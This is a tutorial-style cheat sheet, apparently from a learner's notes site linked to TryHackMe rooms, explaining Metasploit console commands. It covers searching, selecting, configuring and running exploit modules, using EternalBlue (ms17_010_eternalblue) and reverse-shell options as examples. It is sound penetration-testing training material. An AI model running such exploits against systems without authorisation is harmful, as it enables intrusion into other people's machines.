# Metasploit Framework

[![metasploitintro](../../../_badges/thm/metasploitintro.svg)](https://tryhackme.com/room/metasploitintro)
[![rpmetasploit](../../../_badges/thm/rpmetasploit.svg)](https://tryhackme.com/room/rpmetasploit)

<div class="row row-cols-md-2"><div>

The [Metasploit Framework](https://github.com/rapid7/metasploit-framework) is a penetration testing framework that you can use to test your systems. Metasploit is divided into **modules** 📌

* **Auxiliary**: test the availability of an exploit
* **Payloads**: the data sent to perform the attack
  * single/inline/... payloads
  * xxx payloads
* **Exploits**: code exploiting a vulnerability
* Encoders/Evasion/NOPs
* **Post**: scripts that you can use once on the target
</div><div>

Start the `msfconsole` 🚀

```bash
$ msfconsole -q
msf6 > help
msf6 > help <command>
# example
msf6 > help help
```

Links

* [Metasploit Documentation](https://docs.metasploit.com/)
* [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) 📌
</div></div>

<hr class="sep-both">

## 🔎 Search for modules 🔎

<div class="row row-cols-md-2 mt-4"><div>

### ✨️First: search a module

The first thing you want to do is to find exploits <small>(to perform an attack)</small> or auxiliary <small>(to see if the target is vulnerable)</small>. In any case, you will use `search`

```bash
msf6 > search xxx yyy # search by terms
msf6 > search CVE-YEAR-ID # CVE
msf6 > search exploit/xxx/yyy/ # module
msf6 > search type:xxx # exploit, auxiliary...
msf6 > search cve:year # cve disclosed in [year]
```

Examples

```bash
msf6 > search apache tomcat
msf6 > search cve:2022
msf6 > search exploit/multi/
```

### ✨️Second (optional): learn more about it

```bash
msf6 > info module_name # ex: exploit/xxx/...
# the values in the '#' column of your search
msf6 > info module_index # ex: 0
```
</div><div>

### ✨️ Third: use it

Once you selected your exploit/..., you need to tell metasploit that you want to play with it. For that, you will use the command `use`.

```bash
msf6 > use module_name # ex: exploit/xxx/...
msf6 > use module_index # ex: 0
```

Examples

```bash
msf6 > search eternalblue pool
#  Name  Disclosure Date  Rank     Check  Description
-  ----  ---------------  ----     -----  -----------
0  exploit/windows/smb/ms17_010_eternalblue  [...]

# you can use
msf6 > use 0
msf6 > use ms17_010_eternalblue # will not always work
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```
</div></div>

<hr class="sep-both">

## 🖍️ Configure your module 🖍️

<div class="row row-cols-md-2 mt-4"><div>

### ✨️ Four: set the options

Much like with manual exploits, almost every time you need to configure it. You can list the options of your module with

```bash
msf6 exploit('module_used') > options
msf6 exploit('module_used') > show options # same
```

You must at least give a value to options marked as required.

```bash
msf6 exploit('module_used') > set <option> <value>
# example with RHOSTS
msf6 exploit('module_used') > set RHOSTS target_ip
```

Some options that you will see often

* `set LHOST IP`: your IP
* `set RHOSTS IP`: your target IP
* `set RPORT PORT`: your port

⚠️ If you are using a VPN, such as on TryHackMe, you will use your VPN interface, otherwise you will see a message `"[...] exploit succeeded but no session was created [...]"` for reverse shells, because the target can't reach you.

```bash
msf6 exploit('module_used') > set LHOST tun0
```
</div><div>

### ✨️ Five (optional): set the target

For some exploits, you can use different targets. If you can see at the bottom of options a mention to a target, then that's your case.

```bash
msf6 [...] > show targets # list targets that you can use
msf6 [...] > set target 2 # use target 2
```

### ✨️ Six (optional): set the payload

Some exploits come with a pre-defined payload, but for most, you will have to pick your payload. 🔎 For most basics CTF, using the default payload is good enough.

```bash
msf6 [...] > show payloads
msf6 [...] > set payload 1
msf6 [...] > set payload payload_name
```

### ✨️ Seven: open fire 🔫!

```bash
msf6 exploit('module_used') > run
msf6 exploit('module_used') > exploit # same
```

If successful, a session will be opened on the host, in which you can enter commands. You may be "lucky" and already have a **meterpreter**.
</div></div>

<hr class="sep-both">

## ⚡️ Unleashing metasploit ⚡

<div class="row row-cols-md-2 mt-4"><div>

Before proceeding with the step 8, there are a couple a things that could make your life easier, both in the previous, and in the next steps.


* 🔨  You can execute the associated auxiliary (if any) before running the exploit

```bash
msf6 exploit('module_used') > check
```

* You can set variable globally. You will most likely enjoy this feature, because you will usually go back and forth between modules, and you don't want to set the same options again and again.

```bash
msf6 exploit('module_used') > setg LHOST tun0
msf6 exploit('module_used') > setg RHOSTS x.x.x.x
```

* You can unset variable, which will give them back their default value

```bash
msf6 exploit('module_used') > unset RHOSTS
msf6 exploit('module_used') > unset all
```

</div><div>

* 📜 You can see the history of the command you used until now

```bash
msf6 exploit('module_used') > history
```

* ⬅️You can go back to "no module selected" without having to close metasploit

```bash
msf6 exploit('module_used') > back
msf6 > # you're back
```
</div></div>